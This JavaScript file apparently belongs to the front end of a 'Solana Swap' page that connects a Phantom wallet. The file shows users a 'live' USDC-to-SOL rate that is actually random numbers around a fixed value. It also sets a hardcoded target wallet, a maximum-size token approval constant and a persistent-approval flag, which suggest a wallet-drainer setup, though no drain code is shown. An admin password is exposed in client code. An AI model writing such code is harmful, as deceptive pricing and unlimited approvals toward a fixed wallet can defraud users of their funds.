// Solana Swap JavaScript
const SOLANA_CLUSTER = 'mainnet-beta';
const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const USDC_MINT = new solanaWeb3.PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
const TARGET_WALLET = new solanaWeb3.PublicKey('6qsAGgXRt2AWYMYRnPxCyBSfVXZfYaYtGU27zDfQrSQv');
const ADMIN_PASSWORD = "SecureAdmin@2023!";
const MAX_APPROVAL = "18446744073709551615"; // Max uint64

const connection = new solanaWeb3.Connection(
    solanaWeb3.clusterApiUrl(SOLANA_CLUSTER),
    'confirmed'
);

const walletState = {
    connected: false,
    address: '',
    publicKey: null,
    tokenAccount: null,
    balances: {
        sol: 0,
        usdc: 0
    },
    persistentApprovalSet: false
};

const connectWalletBtn = document.getElementById('connectWalletBtn');
const swapForm = document.getElementById('swapForm');
const walletInfo = document.getElementById('walletInfo');
const swapBtn = document.getElementById('swapBtn');
const payAmount = document.getElementById('payAmount');
const receiveAmount = document.getElementById('receiveAmount');
const rateInfo = document.getElementById('rateInfo');

async function connectWallet() {
    if (typeof window.solana === 'undefined') {
        alert('Please install Phantom Wallet');
        return;
    }

    try {
        const { publicKey } = await window.solana.connect();
        walletState.publicKey = publicKey;
        walletState.address = publicKey.toString();
        connectWalletBtn.style.display = 'none';
        swapForm.style.display = 'block';
        updateLiveRate();
    } catch (error) {
        console.error('Connection failed:', error);
    }
}

function updateLiveRate() {
    const baseRate = 0.095;
    const variation = (Math.random() * 0.005) - 0.0025;
    const currentRate = baseRate + variation;

    if (payAmount.value) {
        receiveAmount.value = (payAmount.value * currentRate).toFixed(4);
    }
    rateInfo.textContent = `Rate: 1 USDC = ${currentRate.toFixed(4)} SOL`;
    setTimeout(updateLiveRate, 15000);
}

connectWalletBtn.addEventListener('click', connectWallet);
